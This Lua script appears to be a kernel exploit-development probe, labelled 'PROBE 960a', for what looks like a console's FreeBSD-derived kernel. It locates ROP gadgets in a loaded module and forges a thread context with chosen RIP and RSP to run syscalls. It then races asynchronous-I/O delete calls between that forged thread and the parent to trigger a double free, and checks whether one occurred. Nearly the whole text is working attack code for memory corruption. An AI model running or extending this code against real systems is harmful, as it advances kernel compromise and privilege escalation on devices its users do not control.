-- CRASH_CLASS: HIGH
-- PROBE 960a: aio delete window, with an integrity check that can see a double free
--
-- 954a-959a established the state machine (1 queued, 2 dispatched, 3 completed,
-- 4 cancelled; 0x80020010 = in flight) and that delete on an in-flight object
-- returns immediately. The earlier race pages could not detect a double free
-- because their "fresh object" sanity request was zero-filled and always reported
-- in-flight. This one creates a fresh object with a real fd and buffer and then
-- checks that it still exists, still reports its own state and can be deleted.

print("=== PROBE 960a: AIO DELETE WINDOW ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function hi_lo(v) if type(v)=="table" and v.h then return v.h,v.l end return 0,to_num(v) end
local function show(tag, ok, rv)
    if not ok then print(string.format("  [%s] PCALL-FAIL", tag)) return end
    local h,l=hi_lo(rv) print(string.format("  [%s] ret=0x%08X_%08X", tag, h, l))
end
local function rd(a) local o,v=pcall(function() return to_num(memory.read_dword(a)) end) if o then return v end return -999 end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function addr_of(t) local s=tostring(t) local m=s:match("0x(%x+)") if m then return tonumber(m,16) end return to_num(t) end

local info=memory.alloc(0x200) for i=0,0x1FC,4 do wd(info+i,0) end wd(info,0x160)
pcall(function() mk(593)(uint64(0),uint64(info)) end)
local base=rd(info+0x10C)*4294967296+rd(info+0x108)
local size=rd(info+0x110)
local function find_pat(pat)
    local off=0
    while off<size do
        local want=size-off if want>0x1000 then want=0x1000 end
        local o,s=pcall(function() return memory.read_buffer(base+off,want) end)
        if not o or type(s)~="string" then return nil end
        local i=string.find(s,pat,1,true) if i then return base+off+i-1 end
        off=off+want
    end
end
local fn=to_num(syscall.pipe.fn_addr)
local pop_rax=find_pat(string.char(0x58,0xC3))
local store_rdi=find_pat(string.char(0x48,0x89,0x07,0xC3))
print(string.format("[0] pid=%s base=0x%X pop_rax=0x%X store_rdi=0x%X", tostring(to_num(mk(20)())), base, pop_rax or 0, store_rdi or 0))
if not (pop_rax and store_rdi) then print("[!] gadgets missing"); return end

local Ctx={MAGIC=0x108,TYPE=0x110,CS=0x0C0,RIP=0x0E0,RSP=0x0F8,SS=0x100,RDI=0x048,RSI=0x050,RDX=0x058,RAX=0x078}
local PAGE=0x4000
local function spawn(sysno,a1,a2,a3)
    local block=memory.alloc(PAGE*2)
    for i=0,PAGE*2-4,4 do wd(block+i,0) end
    local ctx=memory.alloc(0x200) for i=0,0x1FC,4 do wd(ctx+i,0) end
    wd(ctx+Ctx.MAGIC,0x480) wd(ctx+Ctx.TYPE,0x10000) wd(ctx+Ctx.CS,0x43) wd(ctx+Ctx.SS,0x3b)
    wq(ctx+Ctx.RIP,uint64(fn)) wq(ctx+Ctx.RSP,uint64(block+PAGE*2-0x200))
    wq(ctx+Ctx.RDI,uint64(a1)) wq(ctx+Ctx.RSI,uint64(a2)) wq(ctx+Ctx.RDX,uint64(a3))
    wq(ctx+Ctx.RAX,uint64(sysno))
    local ch=block+PAGE*2-0x200
    wq(ch,uint64(store_rdi)) wq(ch+8,uint64(pop_rax)) wq(ch+16,uint64(431)) wq(ch+24,uint64(fn))
    return pcall(function() return mk(430)(uint64(ctx)) end)
end
local function mksock()
    local sv=memory.alloc(8) wd(sv,0) wd(sv+4,0)
    local ok=pcall(function() return mk(135)(uint64(1),uint64(1),uint64(0),uint64(sv)) end)
    if not ok then return -1,-1 end
    return rd(sv), rd(sv+4)
end
local function submit_reads(fd, n)
    local reqs=memory.alloc(0x28*n) local ids=memory.alloc(8*n) local buf=memory.alloc(0x1000*n)
    local ba=addr_of(buf)
    for i=0,0x28*n-1,4 do wd(reqs+i,0) end
    for i=0,n-1 do
        local q=reqs+i*0x28
        wd(q+0x08,0x1000)
        wd(q+0x10,(ba+i*0x1000)%4294967296) wd(q+0x14,math.floor((ba+i*0x1000)/4294967296))
        wd(q+0x20,fd)
    end
    local ok=pcall(function() return mk(669)(uint64(0x1001),uint64(reqs),uint64(n),uint64(3),uint64(ids)) end)
    return ok, ids, n
end
local function states(ids,n)
    local st=memory.alloc(8*n)
    pcall(function() return mk(664)(uint64(ids),uint64(n),uint64(st)) end)
    local out=""
    for i=0,n-1 do out=out..tostring(rd(st+i*4)).." " end
    return out
end

local wb=memory.alloc(0x4000)
for i=0,0x3FFC,4 do wd(wb+i,0x41424344) end

for round=1,6 do
    local fd0,fd1 = mksock()
    if fd0<=0 then print("  no socketpair"); break end
    local N=2
    local ok,ids,n = submit_reads(fd0,N)
    if not ok then print("  submit failed"); break end
    local id0,id1 = rd(ids), rd(ids+4)
    local s0 = states(ids,N)
    -- child deletes the same ids (returns EBUSY while in flight)
    local cids=memory.alloc(8*N) for i=0,N-1 do wd(cids+i*4, rd(ids+i*4)) end
    local cerrs=memory.alloc(8*N) for i=0,N-1 do wd(cerrs+i*4,0xFFFFFFFF) end
    spawn(662, cids, N, cerrs)
    -- parent completes the reads and deletes in the same tick
    pcall(function() return mk(133)(uint64(fd1),uint64(wb),uint64(0x2000),uint64(0x80),uint64(0),uint64(0)) end)
    local perrs=memory.alloc(8*N)
    local rok,rv=pcall(function() return mk(662)(uint64(ids),uint64(N),uint64(perrs)) end)
    mk(240)(uint64(0),uint64(20000000))
    -- integrity: a fresh real object must exist, report state and delete
    local ffd0,ffd1 = mksock()
    local fok,fids,_ = submit_reads(ffd0,1)
    local fid=rd(fids)
    local fst=states(fids,1)
    local ferrs=memory.alloc(8)
    local dok=pcall(function() return mk(662)(uint64(fids),uint64(1),uint64(ferrs)) end)
    print(string.format("  [r%d] ids=%08X,%08X child=%08X,%08X parent=%08X,%08X fresh=%08X st=%s fdel=%08X",
        round, id0, id1, rd(cerrs), rd(cerrs+4), rd(perrs), rd(perrs+4), fid, fst, rd(ferrs)))
    pcall(function() mk(6)(uint64(fd0)) end)
    pcall(function() mk(6)(uint64(fd1)) end)
    pcall(function() mk(6)(uint64(ffd0)) end)
    pcall(function() mk(6)(uint64(ffd1)) end)
end
print("[Z] alive pid=" .. tostring(to_num(mk(20)())))
print("=== COMPLETE ===")
